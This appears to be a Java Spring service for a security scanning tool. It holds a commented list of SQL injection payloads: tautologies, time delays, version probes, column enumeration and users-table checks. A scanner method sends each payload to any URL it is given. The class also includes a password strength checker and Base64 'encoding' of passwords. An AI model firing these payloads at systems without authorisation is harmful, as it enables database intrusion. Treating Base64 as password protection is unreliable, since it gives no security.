package com.bd.cybersentinel.service.impl;

import com.bd.cybersentinel.dto.req.VulnerabilityScannerReqDto;
import com.bd.cybersentinel.dto.res.VulnerabilityScannerResDTO;
import com.bd.cybersentinel.entity.VulnerabilityScannerLog;
import com.bd.cybersentinel.repository.VulnerabilityScannerRepo;
import com.bd.cybersentinel.service.VulnerabilityScannerService;
import com.bd.cybersentinel.service.exception.ServiceException;
import com.bd.cybersentinel.util.Response;
import org.modelmapper.ModelMapper;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.stereotype.Service;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.List;
import java.util.stream.Collectors;


@Service
public class VulnerabilityScannerServiceImpl extends AbstractBaseService<VulnerabilityScannerLog> implements VulnerabilityScannerService<VulnerabilityScannerResDTO, VulnerabilityScannerReqDto> {

	// List of SQL injection payloads for security testing and input validation
	private final List<String> sqlPayloads = List.of(
			// ===============================
			// 1. Basic logic-based injections
			// ===============================
			"' OR 1=1 --",           // True condition - bypasses authentication
			"' OR 1=0 --",           // False condition - should fail
			"' OR 'a'='a",           // Always true string comparison
			"' OR 'a'='b",           // False string comparison
			"\" OR \"1\"=\"1",       // Double quote variant
			"' OR '' = '",           // Tests empty string handling
			"' OR 1=1#",             // MySQL-style comment
			"' OR 1=0#",             // False condition with MySQL-style comment

			// ===============================
			// 2. Closing query structure
			// ===============================
			"';--",                  // Terminates current query
			"';-- -",                // Variation with extra space
			"'; WAITFOR DELAY '0:0:5'--", // SQL Server delay (timing-based detection)
			"\"; WAITFOR DELAY '0:0:5'--", // Same with double quotes

			// ===============================
			// 3. Database version detection
			// ===============================
			"' AND (SELECT SUBSTRING(@@version,1,1))='M'--", // Checks if DB is SQL Server (version starts with M)
			"' AND (SELECT SUBSTRING(@@version,1,1))='X'--", // Variant with expected false

			// ===============================
			// 4. Arithmetic conditions
			// ===============================
			"' AND 1=1 --",          // Always true
			"' AND 1=2 --",          // Always false
			"' AND 2 > 1 --",        // Another tautology test

			// ===============================
			// 5. Tautology testing
			// ===============================
			"' OR 3409=3409 --",     // Integer tautology
			"' OR 'pytW'='pytW' --", // String tautology
			"' OR 'pytW'='pytY' --", // String falsehood

			// ===============================
			// 6. HAVING clause manipulation
			// ===============================
			"' HAVING 1=1 --",       // True HAVING condition
			"' HAVING 1=0 --",       // False HAVING condition

			// ===============================
			// 7. ORDER BY enumeration (to find column count)
			// ===============================
			"ORDER BY 1 --",
			"ORDER BY 2 --",
			"ORDER BY 3 --",
			"ORDER BY 100 --",       // Likely to cause error if column doesn't exist

			// ===============================
			// 8. RLIKE injection (MySQL-specific)
			// ===============================
			"' RLIKE (SELECT (CASE WHEN (1=1) THEN 0x61646d696e ELSE 0x28 END)) --", // RLIKE condition true
			"' RLIKE (SELECT (CASE WHEN (1=0) THEN 0x61646d696e ELSE 0x28 END)) --", // RLIKE condition false

			// ===============================
			// 9. Conditional boolean logic
			// ===============================
			"' AND 'x'='x",          // Always true string comparison
			"' AND 'x'='y",          // Always false

			// ===============================
			// 10. Inline injection for structure exposure
			// ===============================
			"' AND (SELECT COUNT(*) FROM users) > 0 --",   // Checks if `users` table has records
			"' AND EXISTS(SELECT * FROM users) --"         // Checks if `users` table exists
	);
	private VulnerabilityScannerRepo vulnerabilityScannerRepo;

	VulnerabilityScannerServiceImpl(VulnerabilityScannerRepo vulnerabilityScannerRepo){
		super(vulnerabilityScannerRepo);
		this.vulnerabilityScannerRepo = vulnerabilityScannerRepo;
	}

	@Override
	public Response<VulnerabilityScannerResDTO> testSqlInjection(String baseUrl) {
		for (String payload : sqlPayloads) {
			String testUrl = baseUrl + URLEncoder.encode(payload, StandardCharsets.UTF_8);
			try {
				HttpURLConnection connection = (HttpURLConnection) new URL(testUrl).openConnection();
				connection.setRequestMethod("GET");
				connection.setConnectTimeout(5000);
				connection.setReadTimeout(10000);
				String body = new String(connection.getInputStream().readAllBytes());

				// Basic detection logic (can be enhanced)
				if (body.toLowerCase().contains("sql syntax")
						|| body.toLowerCase().contains("mysql")
						|| body.toLowerCase().contains("psql")
						|| body.toLowerCase().contains("exception")) {
					createEntity(new VulnerabilityScannerLog().setIsVulnerable(true).setSearchUrl(baseUrl));

					return getSuccessResponse("‚ö†Ô∏è SQL Injection detected with payload: " + payload);
				}

			} catch (Exception e) {
				return getErrorResponse("‚ùå Error testing payload: " + payload + " - " + e.getMessage());
			}
		}
		createEntity(new VulnerabilityScannerLog().setIsVulnerable(false).setSearchUrl(baseUrl));

		return getSuccessResponse("‚úÖ No obvious SQL Injection detected.");
	}

	@Override
	public Response<VulnerabilityScannerResDTO> find(Long id) throws ServiceException {
		return null;
	}

	@Override
	public Response<VulnerabilityScannerResDTO> save(VulnerabilityScannerReqDto reqDto) throws ServiceException {
		return null;
	}

	@Override
	public Response<VulnerabilityScannerResDTO> update(VulnerabilityScannerReqDto reqDto) throws ServiceException {
		return null;
	}

	@Override
	public Response<VulnerabilityScannerResDTO> getAll(Pageable pageable, Boolean isPageable) throws ServiceException {
		if(Boolean.TRUE.equals(isPageable)) {
			Page<VulnerabilityScannerLog> page = vulnerabilityScannerRepo.findAllByDeleted(false, pageable);
			if(!page.hasContent()) return getErrorResponse("No log found in this system");

			return getSuccessResponse(
					"Found Vulnerability Scanner Logs",
					page.map(data -> new ModelMapper().map(data, VulnerabilityScannerResDTO.class))
			);
		}
		List<VulnerabilityScannerLog> list = vulnerabilityScannerRepo.findAllByDeleted(false);
		if(list == null || list.isEmpty()) return getErrorResponse("No log found in this system");

		return getSuccessResponse(
				"Found Vulnerability Scanner Logs",
				list.stream().map(data -> new ModelMapper().map(data, VulnerabilityScannerResDTO.class))
						.collect(Collectors.toList())
		);
	}

	@Override
	public Response<VulnerabilityScannerResDTO> delete(VulnerabilityScannerReqDto reqDto) throws ServiceException {
		return null;
	}

	@Override
	public Response<VulnerabilityScannerResDTO> remove(Long id) throws ServiceException {
		return null;
	}

	@Override
	public Response<VulnerabilityScannerResDTO> checkPasswordStrength(String password) {
		if (password == null || password.length() < 8) return getSuccessResponse("Weak: Password must be at least 8 characters long.");

		boolean hasUpper = false;
		boolean hasLower = false;
		boolean hasDigit = false;
		boolean hasSpecial = false;

		for (char ch : password.toCharArray()) {
			if (Character.isUpperCase(ch)) hasUpper = true;
			else if (Character.isLowerCase(ch)) hasLower = true;
			else if (Character.isDigit(ch)) hasDigit = true;
			else if ("!@#$%^&*()-_=+[]{}|;:'\",.<>?/`~".indexOf(ch) >= 0) hasSpecial = true;
		}

		if (!hasUpper) return getSuccessResponse("Weak: Must contain at least one uppercase letter.");
		if (!hasLower) return getSuccessResponse("Weak: Must contain at least one lowercase letter.");
		if (!hasDigit) return getSuccessResponse("Weak: Must contain at least one number.");
		if (!hasSpecial) return getSuccessResponse("Weak: Must contain at least one special character.");

		return getSuccessResponse("Strong Password üí™");
	}

	@Override
	public Response<VulnerabilityScannerResDTO> encode(String password) {
		String encoded = Base64.getEncoder().encodeToString(password.getBytes());

		return getSuccessResponse(encoded);
	}

	@Override
	public Response<VulnerabilityScannerResDTO> decode(String password) {
		String decoded = new String(Base64.getDecoder().decode(password));

		return getSuccessResponse(decoded);
	}
}
